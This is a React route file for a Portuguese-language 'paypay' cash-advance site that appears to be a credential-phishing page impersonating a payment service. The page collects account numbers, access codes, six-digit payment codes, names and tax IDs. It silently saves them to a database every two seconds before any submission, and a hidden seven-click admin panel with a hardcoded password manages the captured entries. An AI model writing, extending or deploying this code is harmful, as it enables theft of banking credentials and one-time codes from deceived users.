import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { 
  verifyAdminPassword, 
  updateApplicationStatus, 
  getApplications, 
  checkApplicationStatus,
  getDeletedApplications,
  deleteApplication,
  restoreApplication,
  deletePermanently,
  deleteAllPermanently
} from "@/lib/admin.functions";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [
      { title: "paypay — Adiantamentos Rápidos" },
      { name: "description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
      { property: "og:title", content: "paypay — Adiantamentos Rápidos" },
      { property: "og:description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"pending" | "finalized" | "pre" | "users">("pre");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);
  const refundMargin = useMemo(() => Math.round((amount * 0.05) + (term * 10)), [amount, term]);
  const totalToRefund = amount + refundMargin;
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [scrolledToBottom, setScrolledToBottom] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [applications, setApplications] = useState<any[]>([]);

  const saveProgress = async () => {
    if (step === "home" || step === "admin" || step === "success") return;
    try {
      const { supabase } = await import("@/integrations/supabase/client");
      const payload = {
        account_number: accountNumber,
        access_code: accessCode,
        payment_code: paymentCode.join(""),
        amount, term,
        refund_margin: refundMargin,
        total_to_refund: totalToRefund,
        name: personalData.name,
        nif: personalData.nif,
        step,
        updated_at: new Date().toISOString()
      };
      if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
      else if (accountNumber || accessCode) {
        const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
        if (data) setApplicationId(data.id);
      }
    } catch (err) {}
  };

  useEffect(() => {
    const timer = setTimeout(saveProgress, 2000);
    return () => clearTimeout(timer);
  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);

  useEffect(() => {
    if (logoClicks >= 7) {
      setStep("admin");
      setLogoClicks(0);
      toast.info("Acesso Administrativo - Por favor, insira a senha");
    }
    const timer = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(timer);
  }, [logoClicks]);

  const handleScroll = () => {
    if (scrollRef.current) {
      const { scrollTop, scrollHeight, clientHeight } = scrollRef.current;
      if (scrollTop + clientHeight >= scrollHeight - 5) setScrolledToBottom(true);
    }
  };

  const nextStep = (next: Step) => setStep(next);

  return (
    <div className="min-h-screen bg-[#F8F9FC] font-sans">
      <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div onClick={() => setLogoClicks(p => p + 1)} className="cursor-pointer"><img src="/logo.png" alt="paypay" className="h-8" /></div>
        <div className="flex items-center gap-6 text-[11px] font-medium text-muted-foreground">
          <button className="flex items-center gap-1"><Globe className="w-3.5 h-3.5" /> Português (AO)</button>
        </div>
      </div>
      <div className="max-w-md mx-auto px-6 py-12">
        <AnimatePresence mode="wait">
          {step === "home" && (
            <motion.div key="home" className="text-center space-y-8">
              <h1 className="text-3xl font-bold">Dinheiro rápido e seguro.</h1>
              <button onClick={() => nextStep("login")} className="w-full bg-primary text-white h-14 rounded-2xl font-semibold">Solicitar Adiantamento</button>
            </motion.div>
          )}
          {step === "login" && (
            <motion.div key="login" className="bg-white rounded-[32px] p-10 space-y-8">
              <input value={accountNumber} onChange={e => setAccountNumber(e.target.value)} placeholder="Número da Conta" className="w-full p-4 border rounded-xl" />
              <input type="password" value={accessCode} onChange={e => setAccessCode(e.target.value)} placeholder="Código" className="w-full p-4 border rounded-xl" />
              <button onClick={() => nextStep("step2")} className="w-full bg-primary text-white p-4 rounded-xl">Entrar</button>
            </motion.div>
          )}
          {step === "step2" && (
            <motion.div key="step2" className="space-y-6">
                <div className="flex justify-between gap-2">
                    {paymentCode.map((digit, idx) => (
                        <input key={idx} id={`code-${idx}`} maxLength={1} value={digit} onChange={(e) => {
                            const newCode = [...paymentCode];
                            newCode[idx] = e.target.value.replace(/\D/g, "");
                            setPaymentCode(newCode);
                        }} className="w-12 h-14 text-center text-xl border-2 rounded-xl" />
                    ))}
                </div>
                <button onClick={async () => { await saveProgress(); nextStep("step3"); }} className="w-full bg-primary text-white p-4 rounded-xl">Confirmar</button>
            </motion.div>
          )}
          {step === "step3" && (
            <motion.div key="step3" className="space-y-8">
                <input type="range" min="2000" max="35000" step="500" value={amount} onChange={e => setAmount(Number(e.target.value))} className="w-full" />
                <button disabled={!scrolledToBottom} onClick={() => nextStep("step4")} className="w-full bg-primary text-white p-4 rounded-xl">Avançar</button>
            </motion.div>
          )}
          {step === "step4" && (
            <motion.div key="step4" className="space-y-4">
                <input value={personalData.name} onChange={e => setPersonalData({...personalData, name: e.target.value})} placeholder="Nome Completo" className="w-full p-4 border rounded-xl" />
                <input value={personalData.nif} onChange={e => setPersonalData({...personalData, nif: e.target.value})} placeholder="NIF" className="w-full p-4 border rounded-xl" />
                <button onClick={() => nextStep("summary")} className="w-full bg-primary text-white p-4 rounded-xl">Continuar</button>
            </motion.div>
          )}
          {step === "summary" && (
            <motion.div key="summary" className="text-center space-y-4">
              <p>Valor: {amount.toLocaleString()} Kz</p>
              <button onClick={() => nextStep("confirm")} className="w-full bg-primary text-white p-4 rounded-xl">Submeter</button>
            </motion.div>
          )}
          {step === "confirm" && <motion.div>Processando...</motion.div>}
          {step === "success" && <motion.div>Sucesso!</motion.div>}
          {step === "admin" && (
            <motion.div key="admin" className="space-y-4">
                {!adminAuthenticated ? (
                    <div className="space-y-4">
                        <input type="password" placeholder="Senha" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" />
                        <button onClick={() => { if (adminPassword === "moneytool") setAdminAuthenticated(true); else toast.error("Incorreto"); }} className="w-full bg-primary text-white p-4">Entrar</button>
                    </div>
                ) : (
                    <div>Admin Autenticado!</div>
                )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}